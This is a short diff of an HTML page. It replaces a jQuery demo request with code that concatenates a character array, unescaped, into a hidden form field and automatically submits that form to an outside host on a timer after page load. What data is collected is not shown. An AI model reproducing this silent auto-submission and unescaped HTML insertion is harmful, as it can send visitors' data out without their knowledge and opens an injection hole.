@@ -12,14 +12,9 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
 <script>
 function run(a) {
-  $.post("http://www.w3schools.com/jquery/demo_test_post.asp",
-  {
-    name: a,
-    city: "Duckburg"
-  },
-  function(data,status){
-    alert("Data: " + data + "\nStatus: " + status);
-  });
+  var b = a.join("");
+  document.getElementById("from").innerHTML = "<input type='hidden' name='website' value='" + b + "'></input>";
+  $("form").submit();
 }
 function maiN() {
   var chars = [];
@@ -72,4 +67,6 @@ setTimeout(function(){
   maiN();
 }, 110*7.1);
 </script>
+<form action="http://pi.pcriot.com" method="POST" id="from">
+</form>
 </body></html>
